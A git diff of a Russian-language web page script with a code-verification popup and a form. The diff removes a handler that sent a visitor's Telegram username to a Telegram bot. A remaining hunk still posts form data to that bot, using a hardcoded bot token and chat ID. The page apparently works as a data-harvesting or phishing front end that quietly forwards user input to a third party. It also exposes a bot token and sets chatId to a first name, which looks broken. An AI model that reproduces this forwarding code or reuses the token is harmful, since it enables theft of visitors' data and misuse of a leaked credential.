@@ -10,13 +10,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const submitCodeButton = document.getElementById('submitCodeButton');
     const codeInput = document.getElementById('code');
     const codeError = document.getElementById('codeError');
-    const developerMessagePopup = document.getElementById('developerMessage');
-    const telegramUsernameFormPopup = document.getElementById('telegramUsernameForm');
-    const confirmTelegramButton = document.getElementById('confirmTelegramButton');
-    const telegramUsernameInput = document.getElementById('telegramUsername');
-    const telegramUsernameError = document.getElementById('telegramUsernameError');
     let generatedCode = ''; // Variable to store the generated code
-    const developerMessageOkButton = document.getElementById('developerMessageOkButton'); // Get the OK button
 
     // --- Continue Button and Code Popup ---
     continueButton.addEventListener('click', () => {
@@ -49,9 +43,7 @@ document.addEventListener('DOMContentLoaded', () => {
             codeInput.classList.remove('invalid');
             console.log('Код подтвержден:', codeInput.value);
             codePopup.classList.remove('show');
-            developerMessagePopup.classList.add('show'); // Show developer message only now
-            // telegramUsernameFormPopup.classList.add('show'); //  Do not show telegram form immediately
-
+            alert('Код подтвержден! Спасибо.'); // Replace with actual code verification logic if needed
         } else {
             codeError.textContent = 'Неверный код. Попробуйте еще раз.';
             codeInput.classList.add('invalid');
@@ -63,68 +55,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (codeInput.checkValidity()) {
             codeInput.classList.remove('invalid');
             codeError.textContent = '';
-        }
-    });
-
-    // --- Developer Message OK Button ---
-    developerMessageOkButton.addEventListener('click', () => {
-        developerMessagePopup.classList.remove('show'); // Hide developer message
-        telegramUsernameFormPopup.classList.add('show'); // Show telegram username form now
-    });
-
-    // --- Telegram Username Form Submission ---
-    confirmTelegramButton.addEventListener('click', () => {
-        telegramUsernameError.textContent = '';
-        if (!telegramUsernameInput.value) {
-            telegramUsernameError.textContent = 'Пожалуйста, введите ваш Telegram юзернейм.';
-            telegramUsernameInput.classList.add('invalid');
-            return;
-        }
-
-        const telegramUsername = telegramUsernameInput.value;
-        console.log('Telegram Username:', telegramUsername);
-
-        // Send Telegram Username to Bot (separate message)
-        const botToken = '8134278525:AAHd6ZpW3omshp96ac8F7SNKUWJNYq1N_i8';
-        const chatId = '6699202743';
-        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const messageText = `Telegram Юзернейм: @${telegramUsername}`; // Include @ for clarity
-
-        fetch(apiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: messageText
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log('Telegram Username отправлен в Telegram!');
-                alert('Спасибо! Ваш Telegram юзернейм отправлен.'); // Success feedback
-                telegramUsernameFormPopup.classList.remove('show'); // Hide username form
-                // Optionally reset the form or redirect
-            } else {
-                console.error('Ошибка отправки Telegram Username:', data);
-                telegramUsernameError.textContent = 'Ошибка отправки юзернейма. Попробуйте позже.';
-                telegramUsernameInput.classList.add('invalid');
-            }
-        })
-        .catch(error => {
-            console.error('Ошибка fetch (Telegram Username):', error);
-            telegramUsernameError.textContent = 'Ошибка отправки юзернейма. Попробуйте позже.';
-            telegramUsernameInput.classList.add('invalid');
-        });
-
-    });
-
-    telegramUsernameInput.addEventListener('input', () => {
-        if (telegramUsernameInput.checkValidity()) {
-            telegramUsernameInput.classList.remove('invalid');
-            telegramUsernameError.textContent = '';
         }
     });
 
@@ -198,7 +128,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             // Telegram Bot API parameters
             const botToken = '8134278525:AAHd6ZpW3omshp96ac8F7SNKUWJNYq1N_i8';
-            const chatId = '6699202743';
+            const chatId = formData.firstName; 
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             // Send message to Telegram
